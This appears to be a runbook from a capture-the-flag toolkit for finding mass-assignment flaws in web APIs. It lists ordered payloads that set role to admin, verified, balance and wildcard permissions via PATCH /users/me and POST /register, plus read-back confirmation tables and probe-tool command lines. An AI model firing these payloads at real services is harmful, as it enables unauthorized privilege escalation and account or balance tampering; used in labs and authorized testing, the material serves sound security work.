# Field manual deep — the mass-assignment runbook, extended

## The complete probe sequence

```
endpoint ← the widest binder (PATCH /me > PUT > POST/register > orders)
field    ← the highest-value semantic (privilege > verify > econ > plan)
carrier  ← the least-tested transport (nested > form > multipart > json)
```

```
P1: PATCH /users/me {"role":"admin"}                    ← widest binder
P2: PATCH /users/me {"profile":{"role":"admin"}}        ← nested tunnel
P3: PATCH /users/me {"verified":true}                   ← second semantic
P4: PATCH /users/me {"balance":99999}                   ← third semantic
P5: PATCH /users/me role=admin                          ← form carrier
P6: PATCH /users/me {"permissions":["*"]}               ← array scope
P7: POST /register {"role":"admin"}                     ← create binder
P8: POST /register role=admin                           ← form on create
P9: PATCH /users/me {"groups":[{"id":1}]}               ← FK array
P10: PATCH /users/me {"role":1}                         ← typed variant
```

Stop at the first stored+decision-changed pair; each falsifier closes
a cell and opens the next.

## The read-back discipline

```
write    → POST/PATCH the canary
read     → GET a DIFFERENT endpoint (never the write's own echo)
diff     → canary's read-back vs control's read-back
exercise → the gated route/total/state the field controls
```

Four observations, four decisions: stored? changed? attributed? fresh?

## The attribution table

| Observation | The call |
|---|---|
| canary echo `admin`, control echo `user` | parse reached — maybe stored |
| canary rb `admin`, control rb `user` | STORED |
| canary rb `admin`, control rb `admin` | default — not a write |
| canary rb `user`, control rb `user` | dropped — falsifier |
| rb `admin`, gate `200` | CONFIRMED — decision changed |
| rb `admin`, gate `403` | inert — gate reads elsewhere |

## The falsifier-to-next-cell map

```
endpoint falsifier (flat drop)      → nested → form → PATCH → PUT
schema falsifier (400)              → form → multipart → PATCH
binder-family falsifier             → /import → GraphQL → /admin
model falsifier                     → class dead → decide.py
semantic falsifier (inert)          → is_staff → permissions → JWT
```

## The tool command set

```bash
# the field matrix
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'username=p&password=x' --readback "$BASE/api/me"

# a specific field set
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'u=p&p=x' --readback "$BASE/api/me" \
  --fields role is_admin verified balance

# the query carrier
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --method GET --readback "$BASE/api/me"

# auth headers
python3 tools/web/binding_probe.py --url "$BASE/users/me" \
  --body 'name=x' --readback "$BASE/api/me" --headers 'Cookie: s=..'

# the offline self-test
python3 tools/web/binding_probe.py --selftest
```

## The evidence commands

```bash
# class evidence
python3 tools/hooks.py post-probe <ch> \
  --request "PATCH /users/me role=admin" --verdict confirms \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind class --evidence '"role":"admin"' \
  --response "$(cat rb.txt)"

# impact evidence
python3 tools/hooks.py post-probe <ch> \
  --request "GET /admin (new state)" --verdict confirms \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind impact --evidence '200 + privileged data' \
  --response "$(cat admin.txt)"

# falsifier
python3 tools/hooks.py post-probe <ch> \
  --request "PATCH /users/me role=admin" --verdict falsified \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind class --evidence 'rb "role":"user" = control' \
  --response "$(cat rb.txt)"
```

## The close-out

```bash
# the flag through the gate
python3 tools/hooks.py pre-flag <ch> \
  --value "<flag>" --source "<where read>" \
  --evidence "<verbatim response excerpt>"

# file the solve — promotes catalogue→verified
python3 tools/classify_solve.py --chain <id>
```
